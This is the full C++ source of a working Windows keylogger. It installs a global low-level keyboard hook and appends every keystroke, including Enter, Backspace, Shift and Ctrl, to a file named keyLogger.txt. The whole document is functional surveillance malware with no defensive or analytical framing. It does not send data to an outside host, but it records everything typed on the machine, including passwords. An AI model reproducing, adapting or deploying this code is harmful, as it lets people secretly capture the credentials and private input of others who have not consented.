#include <iostream>
#include <fstream>
#include <Windows.h>

using namespace std;

// Function to log the keystroke to a file
void logKeyStroke(int key) {
    ofstream logFile;
    logFile.open("keyLogger.txt", ios::app);

    if (key == VK_BACK) {
        logFile << "[BACKSPACE]";
    } else if (key == VK_RETURN) {
        logFile << "[ENTER]";
    } else if (key == VK_SPACE) {
        logFile << " ";
    } else if (key == VK_TAB) {
        logFile << "[TAB]";
    } else if (key == VK_SHIFT) {
        logFile << "[SHIFT]";
    } else if (key == VK_CONTROL) {
        logFile << "[CTRL]";
    } else if (key == VK_ESCAPE) {
        logFile << "[ESC]";
    } else if (key == VK_OEM_PERIOD) {
        logFile << ".";
    } else if (key >= 'A' && key <= 'Z') { // Alphabetic keys
        logFile << char(key);
    } else if (key >= '0' && key <= '9') { // Numeric keys
        logFile << char(key);
    } else { // Log other keys using their virtual keycode
        logFile << "{" << key << "}";
    }

    logFile.close();
}

// Callback function for keyboard events
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* pKeyBoard = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
        int key = pKeyBoard->vkCode;
        logKeyStroke(key);
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main() {
    // Install the low-level keyboard hook
    HHOOK keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
    if (!keyboardHook) {
        MessageBox(NULL, "Failed to install hook!", "Error", MB_ICONERROR);
        return 1;
    }

    // Message loop to keep the hook active
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // Uninstall the keyboard hook
    UnhookWindowsHookEx(keyboardHook);
    return 0;
}